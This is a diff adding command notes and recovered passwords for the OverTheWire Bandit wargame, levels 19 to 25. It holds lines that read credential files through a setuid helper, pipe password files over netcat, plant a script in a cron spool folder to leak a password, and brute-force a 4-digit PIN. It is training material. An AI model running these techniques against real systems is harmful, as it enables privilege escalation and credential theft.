@@ -52,4 +52,19 @@ xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
 
 bandit17@bandit:~$ diff passwords.old passwords.new kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
 ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+bandit20@bandit:~$ nc -lp 2225 </etc/bandit_pass/bandit20 &./suconnect 2225 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+bandit22@bandit:~$ mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+bandit22@bandit:~$ echo $mytarget
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+bandit23@bandit:~$ echo -e '#!/bin/bash\nnc localhost 2222 </etc/bandit_pass/bandit24' > /var/spool/bandit24/pass.sh & chmod a+rwx /var/spool/bandit24/pass.sh
+bandit23@bandit:~$ nc -v -l -p 2222 localhost UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
+nc -v localhost 30002 -c "for pin in $(seq -f "%04g" 1 9999); do cat <(echo 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin');done"
+for p in $(seq -f "%04g" 1 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $p; done
+
+bandit24@bandit:~$ for p in $(seq -f "%04g" 1 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $p; done | nc -v localhost 30002
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
